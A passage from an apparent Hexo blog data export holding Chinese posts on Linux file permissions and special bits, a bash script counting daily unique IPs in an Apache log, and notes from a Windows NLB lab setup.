表示有setuid标志 (rwxrw-r--:rwsrw-r--)<br />rwxrwsrw- 表示有setgid标志  (rwxrwxrw-:rwxrwsrw-)<br />rwxrw-rwt 表示有sticky标志 (rwxrw-rwx:rwxrw-rwt)</p><p>理解文件权限</p><p>所谓的文件权限，是指对文件的访问权限，包括对文件的读、写、删除、执行。Linux  是一个多用户操作系统，它允许多个用户同时登录和工作。因此 Linux 将一个文件或目录与一个用户和组联系起来。请看下面的例子：</p><p>&#160;&#160;&#160;&#160;  drwxr-xr-x 5 root root 1024 Sep 13 03:27 Desktop</p><p>&#160;&#160;&#160;&#160;  与文件权限相关联的是第一、第三、第四个域。第三个域是文件的所有者，第四个域是文件的所属组，而第一个域则限制了文件的访问权限。在这个例子中，文件的  所有者是 root，所属的组是 root，文件的访问权限是  drwxr-xr-x。对于文件和目录讲，每个文件和目录都有一组权限标志和它们结合在一起，在上例中就是第一个域中的内容。下面来仔细分析这个域中各个  符号的意义：</p><p>&#160;&#160;&#160;&#160; 该域由 10 个字符组成，可以把它们分为四组，具体含义分别是：</p><p>&#160;&#160;&#160;&#160; d rwx  r-x r-x</p><p>&#160;&#160;&#160;&#160; 文件类型 所有者权限标志 组权限标志 其他用户权限标志</p><p>&#160;&#160;&#160;&#160; 其中：</p><p>&#160;&#160;&#160;&#160;  文件类型：第一个字符。由于 Linux 系统对与设备、目录、文件都当作是文件来处理，因此该字符表明此文件的类型，字符与对应的意义如下表：</p><p>&#160;&#160;&#160;&#160; 权限标志：</p><p>&#160;&#160;&#160;&#160; 对每个文件或目录都有 4  类不同的用户。每类用户各有一组读、写和执行（搜索）文件的访问权限，这 4 类用户是：</p><p>&#160;&#160;&#160;&#160; root：系统特权用户类，既  UID = 0 的用户。</p><p>&#160;&#160;&#160;&#160; owner：拥有文件的用户。</p><p>&#160;&#160;&#160;&#160;  group：共享文件的组访问权限的用户类的用户组名称。</p><p>&#160;&#160;&#160;&#160; world：不属于上面 3 类的所有其他用户。</p><p>&#160;&#160;&#160;&#160;  作为  root，他们自动拥有了所有文件和目录的全面的读、写和搜索的权限，所以没有必要明确指定他们的权限。其他三类用户则可以在耽搁文件或者目录的基础上别  授权或撤消权限。因此对另外三类用户，一共 9 个权限位与之对应，分为 3 组，每组 3 个，分别用 r、w、x 来表示，分别对应  owner、group、world。</p><p>&#160;&#160;&#160;&#160; 权限位对于文件和目录的含义有些许不同。每组 3  个字符对应的含义从左至右的顺序，对于文件来说是：读文件的内容（r）、写数据到文件（w）、做为命令执行该文件（x）。对于目录来说是：读包含在目录中  的文件名称（r）、写信息到目录中去（增加和删除索引点的连接）、搜索目录（能用该目录名称作为路径名去访问它所包含的文件或子目录）。具体来说就是：</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1． 有只读权限的用户不能用 cd 进入该目录；还必须有执行权限才能进入。</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2． 有执行权限的用户只有在知道文件名并拥有该文件的读权限的情况下才可以访问目录下的文件。</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 3．  必须有读和执行权限才可以使用 ls 列出目录清单，或使用 cd 进入目录。</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 4．  如用户有目录的写权限，则可以创建、删除或修改目录下的任何文件或子目录，既是该文件或子目录属于其他用户。</p><p>修改文件权限</p><p>&#160;&#160;&#160;&#160;  首先讲修改文件的所有权，使用 chown 和 chgrp 命令：</p><p>&#160;&#160;&#160;&#160; chown new_user file or  directory：修改文件或目录的所有者。</p><p>&#160;&#160;&#160;&#160; chgrp new_group file or  directory：修改文件或目录的所属组。</p><p>&#160;&#160;&#160;&#160; 这里需要注意的是：普通用户不能将文件或目录的所有权交与他人，只有  root 有这一权限。但是普通用户有权改变文件或目录的所属组。</p><p><br />由于每类用户的权限都是由 rwx  三位组成，因此可以用三个八进制数字表示文件的访问权。一个八进制数字可以用三个二进制数字表示，那么与其对应，权值为 4 的位对应 r，权值为 2  的位对应 w，权值为 1 的位对应 x。对于一类用户，将这三位与其对应的权值相乘求和，就可以得出对该类用户的访问权限。</p><p>&#160;&#160;&#160;&#160;  改变文件访问权限的命令是 chmod，格式是：</p><p>&#160;&#160;&#160;&#160; chmod permission file_name</p><p>&#160;&#160;&#160;&#160;  比如 chmod 764  a.txt,它表示对于文件的所有者，具有对该文件读、写、执行的权限。对于文件所属组的用户，拥有读、写的权限。对于其他用户，只有读权限。</p><p>&#160;&#160;&#160;&#160; 这里需要注意的是：文件的创建者是唯一可以修改该文件访问权限的普通用户，另外一个可以修改文件访问权限的用户是 root。</p><p>&#160;&#160;&#160;&#160; 还有一种表示方法，就是用字符串来设定文件访问权限。其中读用 r 表示，写用 w 表示，执行用 x 表示；所有者用 u  表示，组用户用 g 表示，其他用户用 o 表示，所有用户用 a 表示。那么上面例子就写成西面的模样：</p><p>chmod  a+r,u+w,u+x,g+w a.txt</p><p> </p><p> </p>","site":{"data":{}},"excerpt":"","more":"<p>我们知道文件的权限可以用三个八进制数字表示。其实文件的权限应该用四个八进制来表示，不过用 ls -l  命令时，只显示三个罢了。那个没有显示的八进制数字其实是第一个，它用来设定一些特殊权限。这个八进制数字的三个位是：</p><p>&#160;&#160;&#160;&#160;  SUID SGID sticky-bit</p><p>&#160;&#160;&#160;&#160; 它们的含义是： <br />SUID</p><p><br />当设置了</p><p>SUID 位的文件被执行时，该文件将以所有者的身份运行，也就是说无论谁来执行这个文件，他都有文件所有者的特权。如果所有者是 root  的话，那么执行人就有超级用户的特权了。这时该位将变成一个安全漏洞，因此不要轻易设置该位。 <br />sticky-bit</p><p>sticky   位要求操作系统既是在可执行程序退出后，仍要在内存中保留该程序的映象。这样做是为了节省大型程序的启动时间。但是会占用系统资源。因此设置该位，不如把 程序写好。</p><p>&#160;</p><p><br />每一个文件有所有者及组编号，set uid ；set  gid可以改变用户对文件具有的权限：写和执行.</p><p>setuid: 在执行时具有文件所有者的权限. <br />setgid: 设置目录.  一个目录被标上setgid位,此目录下创建的文件继承该目录的属性. <br />sticky bit: 该位可以理解为防删除位. 设置sticky  bit位后，就算用户对目录具有写权限，但也只能添加文件而不能删除文件。</p><p><br />如何设置：</p><p>操作这些标志与操作文件 权限的命令是一样的, 都是 chmod. 有两种方法来操作, <br />1) chmod u+s temp --  为temp文件加上setuid标志. (setuid 只对文件有效，U=用户) <br />chmod g+s tempdir --  为tempdir目录加上setgid标志 (setgid 只对目录有效，g=组名) <br />chmod o+t temp --  为temp文件加上sticky标志 (sticky只对文件有效)</p><p>2) 采用八进制方式. 这一组八进制数字三位的意义如下, <br />abc  <br />a - setuid位, 如果该位为1, 则表示设置setuid <br />b - setgid位, 如果该位为1,  则表示设置setgid <br />c - sticky位, 如果该位为1, 则表示设置sticky</p><p>rwsrw-r--  表示有setuid标志 (rwxrw-r--:rwsrw-r--)<br />rwxrwsrw- 表示有setgid标志  (rwxrwxrw-:rwxrwsrw-)<br />rwxrw-rwt 表示有sticky标志 (rwxrw-rwx:rwxrw-rwt)</p><p>理解文件权限</p><p>所谓的文件权限，是指对文件的访问权限，包括对文件的读、写、删除、执行。Linux  是一个多用户操作系统，它允许多个用户同时登录和工作。因此 Linux 将一个文件或目录与一个用户和组联系起来。请看下面的例子：</p><p>&#160;&#160;&#160;&#160;  drwxr-xr-x 5 root root 1024 Sep 13 03:27 Desktop</p><p>&#160;&#160;&#160;&#160;  与文件权限相关联的是第一、第三、第四个域。第三个域是文件的所有者，第四个域是文件的所属组，而第一个域则限制了文件的访问权限。在这个例子中，文件的  所有者是 root，所属的组是 root，文件的访问权限是  drwxr-xr-x。对于文件和目录讲，每个文件和目录都有一组权限标志和它们结合在一起，在上例中就是第一个域中的内容。下面来仔细分析这个域中各个  符号的意义：</p><p>&#160;&#160;&#160;&#160; 该域由 10 个字符组成，可以把它们分为四组，具体含义分别是：</p><p>&#160;&#160;&#160;&#160; d rwx  r-x r-x</p><p>&#160;&#160;&#160;&#160; 文件类型 所有者权限标志 组权限标志 其他用户权限标志</p><p>&#160;&#160;&#160;&#160; 其中：</p><p>&#160;&#160;&#160;&#160;  文件类型：第一个字符。由于 Linux 系统对与设备、目录、文件都当作是文件来处理，因此该字符表明此文件的类型，字符与对应的意义如下表：</p><p>&#160;&#160;&#160;&#160; 权限标志：</p><p>&#160;&#160;&#160;&#160; 对每个文件或目录都有 4  类不同的用户。每类用户各有一组读、写和执行（搜索）文件的访问权限，这 4 类用户是：</p><p>&#160;&#160;&#160;&#160; root：系统特权用户类，既  UID = 0 的用户。</p><p>&#160;&#160;&#160;&#160; owner：拥有文件的用户。</p><p>&#160;&#160;&#160;&#160;  group：共享文件的组访问权限的用户类的用户组名称。</p><p>&#160;&#160;&#160;&#160; world：不属于上面 3 类的所有其他用户。</p><p>&#160;&#160;&#160;&#160;  作为  root，他们自动拥有了所有文件和目录的全面的读、写和搜索的权限，所以没有必要明确指定他们的权限。其他三类用户则可以在耽搁文件或者目录的基础上别  授权或撤消权限。因此对另外三类用户，一共 9 个权限位与之对应，分为 3 组，每组 3 个，分别用 r、w、x 来表示，分别对应  owner、group、world。</p><p>&#160;&#160;&#160;&#160; 权限位对于文件和目录的含义有些许不同。每组 3  个字符对应的含义从左至右的顺序，对于文件来说是：读文件的内容（r）、写数据到文件（w）、做为命令执行该文件（x）。对于目录来说是：读包含在目录中  的文件名称（r）、写信息到目录中去（增加和删除索引点的连接）、搜索目录（能用该目录名称作为路径名去访问它所包含的文件或子目录）。具体来说就是：</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 1． 有只读权限的用户不能用 cd 进入该目录；还必须有执行权限才能进入。</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;  2． 有执行权限的用户只有在知道文件名并拥有该文件的读权限的情况下才可以访问目录下的文件。</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 3．  必须有读和执行权限才可以使用 ls 列出目录清单，或使用 cd 进入目录。</p><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; 4．  如用户有目录的写权限，则可以创建、删除或修改目录下的任何文件或子目录，既是该文件或子目录属于其他用户。</p><p>修改文件权限</p><p>&#160;&#160;&#160;&#160;  首先讲修改文件的所有权，使用 chown 和 chgrp 命令：</p><p>&#160;&#160;&#160;&#160; chown new_user file or  directory：修改文件或目录的所有者。</p><p>&#160;&#160;&#160;&#160; chgrp new_group file or  directory：修改文件或目录的所属组。</p><p>&#160;&#160;&#160;&#160; 这里需要注意的是：普通用户不能将文件或目录的所有权交与他人，只有  root 有这一权限。但是普通用户有权改变文件或目录的所属组。</p><p><br />由于每类用户的权限都是由 rwx  三位组成，因此可以用三个八进制数字表示文件的访问权。一个八进制数字可以用三个二进制数字表示，那么与其对应，权值为 4 的位对应 r，权值为 2  的位对应 w，权值为 1 的位对应 x。对于一类用户，将这三位与其对应的权值相乘求和，就可以得出对该类用户的访问权限。</p><p>&#160;&#160;&#160;&#160;  改变文件访问权限的命令是 chmod，格式是：</p><p>&#160;&#160;&#160;&#160; chmod permission file_name</p><p>&#160;&#160;&#160;&#160;  比如 chmod 764  a.txt,它表示对于文件的所有者，具有对该文件读、写、执行的权限。对于文件所属组的用户，拥有读、写的权限。对于其他用户，只有读权限。</p><p>&#160;&#160;&#160;&#160; 这里需要注意的是：文件的创建者是唯一可以修改该文件访问权限的普通用户，另外一个可以修改文件访问权限的用户是 root。</p><p>&#160;&#160;&#160;&#160; 还有一种表示方法，就是用字符串来设定文件访问权限。其中读用 r 表示，写用 w 表示，执行用 x 表示；所有者用 u  表示，组用户用 g 表示，其他用户用 o 表示，所有用户用 a 表示。那么上面例子就写成西面的模样：</p><p>chmod  a+r,u+w,u+x,g+w a.txt</p><p> </p><p> </p>"},{"title":"统计每日访问ip数脚本","date":"2011-09-06T01:40:00.000Z","_content":"<p>#!/bin/bash</p><p>by:key1088</p><p>time1=`date -d '-1 days' +%d/%b/%Y`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #昨天的时间，与apache日志时间一样的格式<br />time2=`date +%Y%m%d -d '-1 days'`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #昨天的时间，年月日&nbsp; 例：2011/02/11<br />echo $time2 &gt;&gt; /stats/ipstream<br />awk -v day=&quot;$time1&quot; '$4~day{print}' /usr/local/apache/logs/access_log|awk '{print $1}'|sort|uniq|wc -l &gt;&gt; /stats/ipstream</p>","source":"_posts/统计每日访问ip数脚本.md","raw":"title: 统计每日访问ip数脚本\ncategories: [Shell编程]\ntags: []\ndate: 2011-09-06 09:40:00\n---\n<p>#!/bin/bash</p><p>by:key1088</p><p>time1=`date -d '-1 days' +%d/%b/%Y`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #昨天的时间，与apache日志时间一样的格式<br />time2=`date +%Y%m%d -d '-1 days'`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #昨天的时间，年月日&nbsp; 例：2011/02/11<br />echo $time2 &gt;&gt; /stats/ipstream<br />awk -v day=&quot;$time1&quot; '$4~day{print}' /usr/local/apache/logs/access_log|awk '{print $1}'|sort|uniq|wc -l &gt;&gt; /stats/ipstream</p>","slug":"统计每日访问ip数脚本","published":1,"updated":"2023-04-22T05:38:45.133Z","_id":"clgrjlxm300by7opiex310upx","comments":1,"layout":"post","photos":[],"link":"","content":"<p>#!/bin/bash</p><p>by:key1088</p><p>time1=`date -d '-1 days' +%d/%b/%Y`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #昨天的时间，与apache日志时间一样的格式<br />time2=`date +%Y%m%d -d '-1 days'`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #昨天的时间，年月日&nbsp; 例：2011/02/11<br />echo $time2 &gt;&gt; /stats/ipstream<br />awk -v day=&quot;$time1&quot; '$4~day{print}' /usr/local/apache/logs/access_log|awk '{print $1}'|sort|uniq|wc -l &gt;&gt; /stats/ipstream</p>","site":{"data":{}},"excerpt":"","more":"<p>#!/bin/bash</p><p>by:key1088</p><p>time1=`date -d '-1 days' +%d/%b/%Y`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #昨天的时间，与apache日志时间一样的格式<br />time2=`date +%Y%m%d -d '-1 days'`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #昨天的时间，年月日&nbsp; 例：2011/02/11<br />echo $time2 &gt;&gt; /stats/ipstream<br />awk -v day=&quot;$time1&quot; '$4~day{print}' /usr/local/apache/logs/access_log|awk '{print $1}'|sort|uniq|wc -l &gt;&gt; /stats/ipstream</p>"},{"title":"网络负载平衡（NLB)试验总结","date":"2010-03-28T03:33:00.000Z","_content":"<p>这两天被这个试验忙死了，居然钻错了方向。</p><p>NLB大致分为四个类型：1.单网卡多播</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  2.单网卡单播</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  3.多网卡多播</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  4.多网卡单播</p><p>这是微软官方说的四种NLB类型。我做单播时候，虚拟机环境下没有做出来。每次重启网卡的时候就提示</p><p>Adapter Ethernet0 may not have network connectivity.MAC address 02:BF:C0:A8:05:01 of adapter Ethernet0 is within the reserved address range or is in use by another virtual adapter on your system.</p><p>一次和第二次分别down机时，可以完成冗余，在第三次切换的时候，无法连接，其他的没有问题了。不知道问题出在哪了，感觉应该是虚拟环境的问题。也没有多少技术含量。</p><p>注意一下几点：</p><p>1.使用NLB管理器的时候，应在本机把本机添加到群集中，不用在其他PC上操作本机。</p><p>2.单播群集里，不能进行通信。</p><p>3.NLB聚合后，不一定就意味着成功，自己测试一下。</p><p> </p><p>在做双网卡多播时，发现一下亮点。欢迎就这样的。</p><p>都属于baidu.com域中。节点一为域控，并在上面配置DNS。节点二为域成员。</p><p>AD：192.168.5.106 255.255.255.0  DNS:192.168.5.106</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  10.0.0.1  255.0.0.0 DNS:10.0.0.1</p><p>key；192.168.5.109 255.255.255.0 DNS：192.168.5.106</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  10.0.0.2  255.0.0.0  DNS：10.0.0.1</p><p> </p><p>测试PC：192.168.5.105  255.255.255.0 DNS：192.168.5.106</p><p>并在主机上做了WEB服务。</p><p>用域名访问没有问题。测试时，把AD的节点网卡DOWN掉，竟然能用域名访问，key的web页。我用NSLOOKUP解析，竟然解析不出来。以为是缓存的问题，把缓存清楚后，还可以。难道是key上面两卡的转换，也许就通过10.0.0.0/8网段解析的，那为什么NSLOOKUP不能解析呢，这问题就不多探讨了，当初应该把key的10.0.0.2网卡down掉，验证一下，现在也没有心思做了。</p><p>原理方面就去microsoft吧，地址奉上。</p><p><a href=\"http://technet.microsoft.com/zh-cn/library/cc784785%28WS.10%29.aspx\">http://technet.microsoft.com/zh-cn/library/cc784785%28WS.10%29.aspx</a></p>","source":"_posts/网络负载平衡（NLB)试验总结.md","raw":"title: 网络负载平衡（NLB)试验总结\ncategories: [网络工程]\ntags: []\ndate: 2010-03-28 11:33:00\n---\n<p>这两天被这个试验忙死了，居然钻错了方向。</p><p>NLB大致分为四个类型：1.单网卡多播</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  2.单网卡单播</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  3.多网卡多播</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  4.多网卡单播</p><p>这是微软官方说的四种NLB类型。我做单播时候，虚拟机环境下没有做出来。每次重启网卡的时候就提示</p><p>Adapter Ethernet0 may not have network connectivity.MAC address 02:BF:C0:A8:05:01 of adapter Ethernet0 is within the reserved address range or is in use by another virtual adapter on your system.</p><p>一次和第二次分别down机时，可以完成冗余，在第三次切换的时候，无法连接，其他的没有问题了。不知道问题出在哪了，感觉应该是虚拟环境的问题。也没有多少技术含量。</p><p>注意一下几点：</p><p>1.使用NLB管理器的时候，应在本机把本机添加到群集中，不用在其他PC上操作本机。</p><p>2.单播群集里，不能进行通信。</p><p>3.NLB聚合后，不一定就意味着成功，自己测试一下。</p><p> </p><p>在做双网卡多播时，发现一下亮点。欢迎就这样的。</p><p>都属于baidu.com域中。节点一为域控，并在上面配置DNS。节点二为域成员。</p><p>AD：192.168.5.106 255.255.255.0  DNS:192.168.5.106</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  10.0.0.1  255.0.0.0 DNS:10.0.0.1</p><p>key；192.168.5.109 255.255.255.0 DNS：192.168.5.106</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  10.0.0.2  255.0.0.0  DNS：10.0.0.1</p><p> </p><p>测试PC：192.168.5.105  255.255.255.0 DNS：192.168.5.106</p><p>并在主机上做了WEB服务。</p><p>用域名访问没有问题。测试时，把AD的节点网卡DOWN掉，竟然能用域名访问，key的web页。我用NSLOOKUP解析，竟然解析不出来。以为是缓存的问题，把缓存清楚后，还可以。难道是key上面两卡的转换，也许就通过10.0.0.0/8网段解析的，那为什么NSLOOKUP不能解析呢，这问题就不多探讨了，当初应该把key的10.0.0.2网卡down掉，验证一下，现在也没有心思做了。</p><p>原理方面就去microsoft吧，地址奉上。</p><p><a href=\"http://technet.microsoft.com/zh-cn/library/cc784785%28WS.10%29.aspx\">http://technet.microsoft.com/zh-cn/library/cc784785%28WS.10%29.aspx</a></p>","slug":"网络负载平衡（NLB)试验总结","published":1,"updated":"2023-04-22T05:38:45.138Z","_id":"clgrjlxm400bz7opi7pnube7z","comments":1,"layout":"post","photos":[],"link":"","content":"<p>这两天被这个试验忙死了，居然钻错了方向。</p><p>NLB大致分为四个类型：1.单网卡多播</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  2.单网卡单播</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  3.多网卡多播</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  4.多网卡单播</p><p>这是微软官方说的四种NLB类型。我做单播时候，虚拟机环境下没有做出来。每次重启网卡的时候就提示</p><p>Adapter Ethernet0 may not have network connectivity.MAC address 02:BF:C0:A8:05:01 of adapter Ethernet0 is within the reserved address range or is in use by another virtual adapter on your system.</p><p>一次和第二次分别down机时，可以完成冗余，在第三次切换的时候，无法连接，其他的没有问题了。不知道问题出在哪了，感觉应该是虚拟环境的问题。也没有多少技术含量。</p><p>注意一下几点：</p><p>1.使用NLB管理器的时候，应在本机把本机添加到群集中，不用在其他PC上操作本机。</p><p>2.单播群集里，不能进行通信。</p><p>3.NLB聚合后，不一定就意味着成功，自己测试一下。</p><p> </p><p>在做双网卡多播时，发现一下亮点。欢迎就这样的。</p><p>都属于baidu.com域中。节点一为域控，并在上面配置DNS。节点二为域成员。</p><p>AD：192.168.5.106 255.255.255.0  DNS:192.168.5.106</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  10.0.0.1  255.0.0.0 DNS:10.0.0.1</p><p>key；192.168.5.109 255.255.255.0 DNS：192.168.5.106</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;  10.0.0.2  255.0.0.0  DNS：10.0.0.1</p><p> </p><p>测试PC：192.168.5.105  255.255.255.0 DNS：192.168.5.106</p><p>并在主机上做了WEB服务。</p><p>用域名访问没有问题。测试时，把AD的节点网卡DOWN掉，竟然能用域名访问，key的web页。我用NSLOOKUP解析，竟然解析不出来。以为是缓存的问题，把缓存清楚后，还可以。难道是key上面两卡的转换，也许就通过10.0.0.0/8网段解析的，那为什么NSLOOKUP不能解析呢，这问题就不多探讨了，当初应该把key的10.0.0.2网卡down掉，验证一下，现在也没有心思做了。</p><p>原理方面就去microsoft吧，地址奉上。</p><p><a 